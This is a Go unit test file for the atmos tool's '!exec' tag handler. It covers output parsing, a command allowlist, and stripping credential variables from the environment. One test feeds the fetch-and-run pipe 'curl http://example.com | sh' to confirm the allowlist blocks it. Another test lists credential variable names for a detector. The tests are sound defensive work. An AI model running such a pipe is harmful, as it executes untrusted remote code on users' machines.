package utils

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/cloudposse/atmos/pkg/schema"
)

// TestProcessTagExec_CustomBinary tests the ProcessTagExec function using a custom bash binary.
func TestProcessTagExec_CustomBinary(t *testing.T) {
	// Create a temporary directory for our custom binary.
	tempDir := t.TempDir()

	// Create a custom bash script that outputs predictable content.
	customBinaryPath := filepath.Join(tempDir, "test-bash")
	if runtime.GOOS == "windows" {
		customBinaryPath += ".bat"
	}

	// Script content based on OS.
	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptContent = `@echo off
if "%1"=="simple" echo hello world
if "%1"=="json" echo {"key": "value", "number": 42}
if "%1"=="array" echo ["item1", "item2", "item3"]
if "%1"=="empty" echo.
if "%1"=="number" echo 123
if "%1"=="complex" echo {"nested": {"key": "value"}, "array": [1, 2, 3], "bool": true, "null": null}
if "%1"=="invalid" echo invalid json {
`
	} else {
		scriptContent = `#!/bin/bash
case "$1" in
  "simple") echo "hello world" ;;
  "json") echo '{"key": "value", "number": 42}' ;;
  "array") echo '["item1", "item2", "item3"]' ;;
  "empty") echo ;;
  "number") echo "123" ;;
  "complex") echo '{"nested": {"key": "value"}, "array": [1, 2, 3], "bool": true, "null": null}' ;;
  "invalid") echo "invalid json {" ;;
esac
`
	}

	err := os.WriteFile(customBinaryPath, []byte(scriptContent), 0o755)
	assert.NoError(t, err)

	// Save original PATH and modify it to include our temp directory.
	originalPath := os.Getenv("PATH")
	t.Setenv("PATH", tempDir+string(os.PathListSeparator)+originalPath)

	tests := []struct {
		name     string
		input    string
		expected interface{}
		wantErr  bool
	}{
		{
			name:     "simple string output",
			input:    "!exec test-bash simple",
			expected: "hello world",
			wantErr:  false,
		},
		{
			name:     "JSON output that gets parsed",
			input:    "!exec test-bash json",
			expected: map[string]interface{}{"key": "value", "number": float64(42)},
			wantErr:  false,
		},
		{
			name:     "JSON array output",
			input:    "!exec test-bash array",
			expected: []interface{}{"item1", "item2", "item3"},
			wantErr:  false,
		},
		{
			name:     "empty output",
			input:    "!exec test-bash empty",
			expected: "",
			wantErr:  false,
		},
		{
			name:     "numeric string output",
			input:    "!exec test-bash number",
			expected: float64(123),
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := ProcessTagExec(tt.input, nil)

			if tt.wantErr {
				assert.Error(t, err)
				return
			}

			assert.NoError(t, err)

			// Normalize line endings for cross-platform compatibility.
			if resultStr, ok := result.(string); ok {
				// Remove trailing whitespace and normalize line endings.
				resultStr = strings.TrimSpace(resultStr)
				assert.Equal(t, tt.expected, resultStr)
			} else {
				assert.Equal(t, tt.expected, result)
			}
		})
	}
}

// TestProcessTagExec_InvalidCommand tests error handling for invalid commands.
func TestProcessTagExec_InvalidCommand(t *testing.T) {
	input := "!exec invalid_command_that_does_not_exist"
	result, err := ProcessTagExec(input, nil)

	assert.Error(t, err)
	assert.Nil(t, result)
}

// TestProcessTagExec_MalformedTag tests error handling for malformed tags.
func TestProcessTagExec_MalformedTag(t *testing.T) {
	input := "!exec"
	result, err := ProcessTagExec(input, nil)

	// This should handle the case where there's no command after !exec.
	assert.Error(t, err)
	assert.Nil(t, result)
}

// TestProcessTagExec_ComplexJSON tests parsing of complex JSON output.
func TestProcessTagExec_ComplexJSON(t *testing.T) {
	// Create a temporary directory for our custom binary.
	tempDir := t.TempDir()

	// Create a custom bash script that outputs complex JSON.
	customBinaryPath := filepath.Join(tempDir, "test-bash")
	if runtime.GOOS == "windows" {
		customBinaryPath += ".bat"
	}

	// Script content based on OS.
	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptContent = `@echo off
echo {"nested": {"key": "value"}, "array": [1, 2, 3], "bool": true, "null": null}
`
	} else {
		scriptContent = `#!/bin/bash
echo '{"nested": {"key": "value"}, "array": [1, 2, 3], "bool": true, "null": null}'
`
	}

	err := os.WriteFile(customBinaryPath, []byte(scriptContent), 0o755)
	assert.NoError(t, err)

	// Save original PATH and modify it to include our temp directory.
	originalPath := os.Getenv("PATH")
	t.Setenv("PATH", tempDir+string(os.PathListSeparator)+originalPath)

	input := "!exec test-bash"
	result, err := ProcessTagExec(input, nil)

	assert.NoError(t, err)

	expected := map[string]interface{}{
		"nested": map[string]interface{}{"key": "value"},
		"array":  []interface{}{float64(1), float64(2), float64(3)},
		"bool":   true,
		"null":   nil,
	}

	assert.Equal(t, expected, result)
}

// TestProcessTagExec_InvalidJSON tests handling of invalid JSON that should be returned as string.
func TestProcessTagExec_InvalidJSON(t *testing.T) {
	// Create a temporary directory for our custom binary.
	tempDir := t.TempDir()

	// Create a custom bash script that outputs invalid JSON.
	customBinaryPath := filepath.Join(tempDir, "test-bash")
	if runtime.GOOS == "windows" {
		customBinaryPath += ".bat"
	}

	// Script content based on OS.
	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptContent = `@echo off
echo invalid json {
`
	} else {
		scriptContent = `#!/bin/bash
echo "invalid json {"
`
	}

	err := os.WriteFile(customBinaryPath, []byte(scriptContent), 0o755)
	assert.NoError(t, err)

	// Save original PATH and modify it to include our temp directory.
	originalPath := os.Getenv("PATH")
	t.Setenv("PATH", tempDir+string(os.PathListSeparator)+originalPath)

	input := "!exec test-bash"
	result, err := ProcessTagExec(input, nil)

	assert.NoError(t, err)
	// Should return as string when JSON parsing fails.
	// Normalize line endings for cross-platform compatibility.
	resultStr := strings.TrimSpace(result.(string))
	assert.Equal(t, "invalid json {", resultStr)
}

// TestProcessTagExec_AllowedCommands_Allowed verifies that a command present in the allowlist executes successfully.
func TestProcessTagExec_AllowedCommands_Allowed(t *testing.T) {
	tempDir := t.TempDir()
	binaryPath := filepath.Join(tempDir, "myecho")
	if runtime.GOOS == "windows" {
		binaryPath += ".bat"
	}

	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptContent = "@echo off\necho allowed\n"
	} else {
		scriptContent = "#!/bin/sh\necho allowed\n"
	}
	require.NoError(t, os.WriteFile(binaryPath, []byte(scriptContent), 0o755))

	originalPath := os.Getenv("PATH")
	t.Setenv("PATH", tempDir+string(os.PathListSeparator)+originalPath)

	cfg := &schema.AtmosConfiguration{
		Exec: schema.ExecConfig{
			AllowedCommands: []string{"myecho"},
		},
	}

	result, err := ProcessTagExec("!exec myecho", cfg)
	require.NoError(t, err)
	assert.Equal(t, "allowed", strings.TrimSpace(result.(string)))
}

// TestProcessTagExec_AllowedCommands_Blocked verifies that a command absent from the allowlist is rejected.
func TestProcessTagExec_AllowedCommands_Blocked(t *testing.T) {
	cfg := &schema.AtmosConfiguration{
		Exec: schema.ExecConfig{
			AllowedCommands: []string{"safe-cmd"},
		},
	}

	result, err := ProcessTagExec("!exec blocked-cmd", cfg)
	require.Error(t, err)
	assert.ErrorIs(t, err, ErrExecCommandNotAllowed)
	assert.Nil(t, result)
}

// TestProcessTagExec_AllowedCommands_BlockedPipe verifies that a pipe containing a non-listed command is rejected.
func TestProcessTagExec_AllowedCommands_BlockedPipe(t *testing.T) {
	cfg := &schema.AtmosConfiguration{
		Exec: schema.ExecConfig{
			AllowedCommands: []string{"curl"},
		},
	}

	// "curl ... | sh" — sh is not in the allowlist.
	result, err := ProcessTagExec("!exec curl http://example.com | sh", cfg)
	require.Error(t, err)
	assert.ErrorIs(t, err, ErrExecCommandNotAllowed)
	assert.Nil(t, result)
}

// TestProcessTagExec_AllowedCommands_Empty verifies that an empty allowlist imposes no restriction.
func TestProcessTagExec_AllowedCommands_Empty(t *testing.T) {
	tempDir := t.TempDir()
	binaryPath := filepath.Join(tempDir, "myecho2")
	if runtime.GOOS == "windows" {
		binaryPath += ".bat"
	}

	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptContent = "@echo off\necho unrestricted\n"
	} else {
		scriptContent = "#!/bin/sh\necho unrestricted\n"
	}
	require.NoError(t, os.WriteFile(binaryPath, []byte(scriptContent), 0o755))

	originalPath := os.Getenv("PATH")
	t.Setenv("PATH", tempDir+string(os.PathListSeparator)+originalPath)

	// Config exists but AllowedCommands is empty — no restriction should apply.
	cfg := &schema.AtmosConfiguration{
		Exec: schema.ExecConfig{
			AllowedCommands: []string{},
		},
	}

	result, err := ProcessTagExec("!exec myecho2", cfg)
	require.NoError(t, err)
	assert.Equal(t, "unrestricted", strings.TrimSpace(result.(string)))
}

// TestIsSensitiveEnvVar verifies that the sensitive-variable detector matches known credential patterns.
func TestIsSensitiveEnvVar(t *testing.T) {
	sensitive := []string{
		"AWS_SECRET_ACCESS_KEY",
		"AWS_SESSION_TOKEN",
		"GITHUB_TOKEN",
		"GH_TOKEN",
		"GITLAB_TOKEN",
		"MY_APP_PASSWORD",
		"SERVICE_API_KEY",
		"DB_PASSWD",
		"DEPLOY_SECRET",
		"TLS_PRIVATE_KEY",
	}
	for _, name := range sensitive {
		assert.True(t, isSensitiveEnvVar(name), "expected %q to be sensitive", name)
	}

	notSensitive := []string{
		"PATH",
		"HOME",
		"USER",
		"AWS_REGION",
		"AWS_ACCESS_KEY_ID",
	}
	for _, name := range notSensitive {
		assert.False(t, isSensitiveEnvVar(name), "expected %q to NOT be sensitive", name)
	}
}

// TestSanitizeEnv verifies that sensitive variables are removed and safe ones are preserved.
func TestSanitizeEnv(t *testing.T) {
	input := []string{
		"PATH=/usr/bin:/bin",
		"HOME=/home/user",
		"GITHUB_TOKEN=ghp_secret",
		"AWS_SECRET_ACCESS_KEY=AKIASECRET",
		"AWS_REGION=us-east-1",
		"MY_PASSWORD=hunter2",
	}
	result := sanitizeEnv(input)

	// Safe vars must be present.
	require.Contains(t, result, "PATH=/usr/bin:/bin")
	require.Contains(t, result, "HOME=/home/user")
	require.Contains(t, result, "AWS_REGION=us-east-1")

	// Sensitive vars must be absent.
	for _, e := range result {
		name, _, _ := strings.Cut(e, "=")
		assert.False(t, isSensitiveEnvVar(name), "sensitive var %q leaked into sanitized env", name)
	}
}
